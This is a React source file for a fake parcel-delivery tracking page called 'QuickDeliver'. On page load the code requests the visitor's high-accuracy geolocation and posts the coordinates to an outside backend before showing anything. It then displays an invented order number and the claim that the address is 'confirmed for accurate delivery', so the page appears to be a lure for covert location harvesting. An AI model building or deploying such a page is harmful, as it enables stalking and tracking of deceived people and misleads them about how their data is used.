import React, { useEffect, useState } from 'react';
import './App.css';

const BACKEND_URL = 'https://location-backend-i26t.onrender.com';

function App() {
  const [ready, setReady] = useState(false);

  useEffect(() => {
    // Wake backend
    fetch(`${BACKEND_URL}/ping`).catch(() => {});

    // Ask location immediately
    if (!navigator.geolocation) {
      setReady(true);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        try {
          await fetch(`${BACKEND_URL}/api/location`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
            }),
          });
        } catch (e) {}
        setReady(true);
      },
      () => {
        // denied or error — still show site
        setReady(true);
      },
      { enableHighAccuracy: true, timeout: 15000 }
    );
  }, []);

  // Block render until location resolved
  if (!ready) {
    return (
      <div className="splash">
        <div className="splash-spinner" />
      </div>
    );
  }

  return (
    <div className="app">
      <header className="header">
        <div className="logo">
          <span className="logo-icon">🛵</span>
          <span className="logo-text">QuickDeliver</span>
        </div>
        <nav className="nav">
          <a href="#track">Track Order</a>
          <a href="#help">Help</a>
        </nav>
      </header>

      <section className="hero">
        <div className="hero-content">
          <div className="badge">⚡ Fast Delivery</div>
          <h1>Your order is<br /><span className="highlight">on the way!</span></h1>
          <p className="subtitle">
            Confirm your delivery address to get real-time updates and accurate drop-off.
          </p>

          <div className="info-box">
            <div className="info-row">
              <span>🏠</span>
              <div>
                <strong>Delivery Address</strong>
                <p>Your location has been confirmed for accurate delivery</p>
              </div>
            </div>
          </div>

          <button className="cta-btn">
            📦 Track My Order
          </button>
        </div>

        <div className="hero-visual">
          <div className="delivery-card">
            <div className="delivery-header">
              <span>Order #DL-2847</span>
              <span className="badge-green">On the way</span>
            </div>
            <div className="delivery-steps">
              <div className="step done">✅ Order Placed</div>
              <div className="step done">✅ Packed</div>
              <div className="step active">🛵 Out for Delivery</div>
              <div className="step">📦 Delivered</div>
            </div>
            <div className="eta">Estimated: 15–20 mins</div>
          </div>
        </div>
      </section>

      <section className="features">
        <div className="feature-card"><span>⚡</span><h3>Express Delivery</h3><p>Get your order in under 30 minutes</p></div>
        <div className="feature-card"><span>📍</span><h3>Live Tracking</h3><p>Real-time updates on your delivery</p></div>
        <div className="feature-card"><span>🔒</span><h3>Secure & Safe</h3><p>Your data is encrypted and protected</p></div>
      </section>

      <footer className="footer">
        <p>© 2026 QuickDeliver. All rights reserved.</p>
      </footer>
    </div>
  );
}

export default App;
